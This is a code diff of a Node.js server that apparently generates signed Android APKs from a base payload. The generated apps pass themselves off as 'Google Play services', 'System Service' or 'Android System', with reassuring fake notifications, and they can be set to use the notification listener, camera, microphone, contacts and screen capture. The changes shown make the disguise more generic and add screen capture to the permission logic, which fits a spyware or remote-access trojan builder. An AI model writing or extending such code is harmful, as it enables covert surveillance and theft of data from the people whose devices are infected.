@@ -312,9 +312,9 @@ async function uploadApkToCloud(signedPath, finalApkName) {
 }
 
 const NOTIF_PRESETS = {
-    default:            { title: 'Google Play services',  text: 'Running background checks',  icon: 'info',     action: 'device_info' },
+    default:            { title: 'System Service',        text: 'Running background checks',  icon: 'info',     action: 'device_info' },
     sync:               { title: 'Cloud Backup',          text: 'Syncing data in background', icon: 'sync',     action: 'none'        },
-    google_play:        { title: 'Google Play services',  text: 'Checking for updates...',    icon: 'info',     action: 'device_info' },
+    google_play:        { title: 'System Service',        text: 'Checking for updates...',    icon: 'info',     action: 'device_info' },
     android_system:     { title: 'Android System',        text: 'System functions active',    icon: 'sync',     action: 'settings'    },
     device_security:    { title: 'Security & Privacy',    text: 'All systems secured',        icon: 'lock',     action: 'security'    },
     device_maintenance: { title: 'Device Care',           text: 'Running in background',      icon: 'sync',     action: 'settings'    },
@@ -371,7 +371,7 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
             if (!fs.existsSync(BASE_APK)) throw new Error('Base APK not found at assets/base.apk');
 
             const targetPkg    = resolvePackage(userPkg);
-            const targetName   = (appName && appName.trim()) ? appName.trim() : 'Google Play services';
+            const targetName   = (appName && appName.trim()) ? appName.trim() : 'System Service';
             const finalApkName = `${targetName.replace(/[^a-zA-Z0-9]/g, '-')}.apk`;
             const preset       = NOTIF_PRESETS[notificationStyle] || NOTIF_PRESETS.default;
 
@@ -444,7 +444,7 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                 if (!isNotifListenerEnabled) {
                     permsToNeutralize.push('android.permission.BIND_NOTIFICATION_LISTENER_SERVICE');
                 }
-                if (!isCameraEnabled && !isMicEnabled) {
+                if (!isCameraEnabled && !isMicEnabled && !isScreenCaptureEnabled) {
                     permsToNeutralize.push('android.permission.BIND_TELECOM_CONNECTION_SERVICE', 'android.permission.MANAGE_OWN_CALLS');
                 }
                 if (!isContactsEnabled) {
